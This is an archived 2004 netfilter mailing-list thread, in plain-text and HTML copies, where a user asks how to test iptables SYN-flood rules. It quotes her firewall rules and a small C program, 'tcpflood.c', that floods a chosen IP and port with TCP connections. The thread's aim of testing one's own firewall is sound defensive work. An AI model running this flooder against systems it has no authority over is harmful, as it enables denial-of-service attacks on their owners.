From: Peggy Kam <ppkam@n-dsi.com>
Subject: Re: How to test synflood prevention
Date: Wed, 18 Feb 2004 15:31:03 -0500
Sender: netfilter-admin@lists.netfilter.org
Message-ID: <4033CB87.9090306@n-dsi.com>
References: <7C9884991ADAE0479C14F10C858BCDF567917A@alderaan.smgtec.com> <4033B66C.9070800@n-dsi.com>
Mime-Version: 1.0
Content-Type: multipart/alternative;
 boundary="------------040409030509030001090005"
Return-path: <netfilter-admin@lists.netfilter.org>
In-Reply-To: <4033B66C.9070800@n-dsi.com>
Errors-To: netfilter-admin@lists.netfilter.org
List-Help: <mailto:netfilter-request@lists.netfilter.org?subject=help>
List-Post: <mailto:netfilter@lists.netfilter.org>
List-Subscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=subscribe>
List-Id: <netfilter.vger.kernel.org>
List-Unsubscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=unsubscribe>
List-Archive: <https://lists.netfilter.org/pipermail/netfilter/>
To: netfilter@lists.netfilter.org

This is a multi-part message in MIME format.
--------------040409030509030001090005
Content-Type: text/plain; charset=ISO-8859-15; format=flowed
Content-Transfer-Encoding: 7bit

Can anyone help?

Thanks again,
Peggy

Peggy Kam wrote:

> Hi,
>
> I tried to use netcat for generating flood and listening on one machine,
>     ie. ./flood.sh attacked_machine_ip attacked_port 1000 | 
> /prod/netcat/bin nc -l -p 2222
>
> And tried to do ./nc ip_address_of_the_above_machine 2222 -x -t
>
> I have also set up the firewall as follows:
> iptables -N SYN_FLOOD
> iptables -i eth1 -A INPUT -p tcp --syn -j SYN_FLOOD
> iptables -A SYN_FLOOD -m limit --limit 2/s --limit-burst 4 -j RETURN
> iptables -A SYN_FLOOD -j DROP
> iptables -A SYN_FLOOD -i eth1 -p tcp ! --syn -m state --state NEW -j DROP
>
> And I have been getting packets transfer between the 2 machines.
>
> May I ask how I can debug the network using this tool netcat.  I am 
> not familar with the raw socket stuff at all.  Any help on this is 
> appreciated.
>
> Thanks in advance,
> Peggy
>
>
> Daniel Chemko wrote:
>
>>Try using raw sockets and cook your own headers, or just use tools that
>>are designed for it, like netcat
>>
>>Peggy Kam wrote:
>>  
>>
>>>Hi,
>>>
>>>I have set up some rules for preventing the synflood attack, ie:
>>>
>>>iptables -A SYN_FLOOD -m limit --limit 2/s --limit-burst 4 -j ACCEPT
>>>iptables -A SYN_FLOOD -j DROP
>>>iptables -A SYN_FLOOD -i eth1 -p tcp ! --syn -m state --state NEW -j
>>>DROP 
>>>
>>>However, the firewall does not seem to filter any packets.  I have
>>>used 
>>>the following tcpflood.c program to generate the flood, however, when
>>>I used tcpdump and checked the message log with the firewall with and
>>>without the above rules, they gave me the same results.  So, may I ask
>>>how I can test the firewall for DoS attack?
>>>
>>>Thanks in advance,
>>>Peggy
>>>
>>>
>>>
>>>#tcpflood.c
>>>
>>>#include <unistd.h>
>>>#include <stdio.h>
>>>#include <netdb.h>
>>>#include <stdlib.h>
>>>#include <string.h>
>>>#include <unistd.h>
>>>#include <sys/socket.h>
>>>#include <netinet/in.h>
>>>#include <arpa/inet.h>
>>>#include <sys/types.h>
>>>
>>>
>>>int main(int argc, char **argv) {
>>>
>>>  struct sockaddr_in to_addr;
>>>  int s;
>>>
>>>  bzero(&to_addr, sizeof(to_addr));
>>>  to_addr.sin_family=AF_INET;
>>>
>>>
>>>  if ( argc == 3 ) {
>>>        to_addr.sin_addr.s_addr=inet_addr(argv[1]);
>>>        to_addr.sin_port=htons(atoi(argv[2]));
>>>  }
>>>
>>>  else {
>>>        fprintf(stderr, "Usage: %s <IP> <PORT>\n", argv[0]);
>>>        return 1;
>>>  }
>>>
>>>  printf("Flooding  %s:%d ...\n", argv[1], atoi(argv[2]));
>>>
>>>  while (1) {
>>>
>>>        if ((s = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
>>>                fprintf(stderr, "Error: socket()\n");
>>>                return 1;
>>>        }
>>>
>>>        if ((connect(s, (struct sockaddr *)&to_addr, sizeof to_addr))
>>>                < 0) { perror("connect()");
>>>                return 1;
>>>        }
>>>
>>>
>>>        printf(".");
>>>        fflush(stdout);
>>>        close(s);
>>>
>>>  }
>>>
>>>  return 0;
>>>
>>>}
>>>
>>
>>  
>>

--------------040409030509030001090005
Content-Type: text/html; charset=ISO-8859-15
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta http-equiv=3D"Content-Type"
 content=3D"text/html;charset=3DISO-8859-15">
  <title></title>
</head>
<body text=3D"#000000" bgcolor=3D"#ffffff">
Can anyone help?<br>
<br>
Thanks again,<br>
Peggy<br>
<br>
Peggy Kam wrote:<br>
<blockquote type=3D"cite" cite=3D"mid4033B66C.9070800@n-dsi.com">
  <meta http-equiv=3D"Content-Type"
 content=3D"text/html;charset=3DISO-8859-15">
  <title></title>
Hi,<br>
  <br>
I tried to use netcat for generating flood and listening on one
machine, <br>
=A0=A0=A0 ie. ./flood.sh attacked_machine_ip attacked_port 1000 |
/prod/netcat/bin nc -l -p 2222<br>
  <br>
And tried to do ./nc ip_address_of_the_above_machine 2222 -x -t<br>
  <br>
I have also set up the firewall as follows:<br>
iptables -N SYN_FLOOD
  <br>
iptables -i eth1 -A INPUT -p tcp --syn -j SYN_FLOOD
  <br>
iptables -A SYN_FLOOD -m limit --limit 2/s --limit-burst 4 -j RETURN<br>
iptables -A SYN_FLOOD -j DROP
  <br>
iptables -A SYN_FLOOD -i eth1 -p tcp ! --syn -m state --state NEW -j
DROP
  <br>
  <br>
And I have been getting packets transfer between the 2 machines.<br>
  <br>
May I ask how I can debug the network using this tool netcat.=A0 I am not
familar with the raw socket stuff at all.=A0 Any help on this is
appreciated.<br>
  <br>
Thanks in advance,<br>
Peggy<br>
  <br>
  <br>
Daniel Chemko wrote:<br>
  <blockquote type=3D"cite"
 cite=3D"mid7C9884991ADAE0479C14F10C858BCDF567917A@alderaan.smgtec.com">
    <pre wrap=3D"">Try using raw sockets and cook your own headers, or ju=
st use tools that
are designed for it, like netcat

Peggy Kam wrote:
  </pre>
    <blockquote type=3D"cite">
      <pre wrap=3D"">Hi,

I have set up some rules for preventing the synflood attack, ie:

iptables -A SYN_FLOOD -m limit --limit 2/s --limit-burst 4 -j ACCEPT
iptables -A SYN_FLOOD -j DROP
iptables -A SYN_FLOOD -i eth1 -p tcp ! --syn -m state --state NEW -j
DROP=20

However, the firewall does not seem to filter any packets.  I have
used=20
the following tcpflood.c program to generate the flood, however, when
I used tcpdump and checked the message log with the firewall with and
without the above rules, they gave me the same results.  So, may I ask
how I can test the firewall for DoS attack?

Thanks in advance,
Peggy



#tcpflood.c

#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/types.h&gt;


int main(int argc, char **argv) {

  struct sockaddr_in to_addr;
  int s;

  bzero(&amp;to_addr, sizeof(to_addr));
  to_addr.sin_family=3DAF_INET;


  if ( argc =3D=3D 3 ) {
        to_addr.sin_addr.s_addr=3Dinet_addr(argv[1]);
        to_addr.sin_port=3Dhtons(atoi(argv[2]));
  }

  else {
        fprintf(stderr, "Usage: %s &lt;IP&gt; &lt;PORT&gt;\n", argv[0]);
        return 1;
  }

  printf("Flooding  %s:%d ...\n", argv[1], atoi(argv[2]));

  while (1) {

        if ((s =3D socket(PF_INET, SOCK_STREAM, 0)) &lt; 0) {
                fprintf(stderr, "Error: socket()\n");
                return 1;
        }

        if ((connect(s, (struct sockaddr *)&amp;to_addr, sizeof to_addr))
                &lt; 0) { perror("connect()");
                return 1;
        }


        printf(".");
        fflush(stdout);
        close(s);

  }

  return 0;

}</pre>
    </blockquote>
    <pre wrap=3D""><!---->
  </pre>
  </blockquote>
</blockquote>
</body>
</html>

--------------040409030509030001090005--


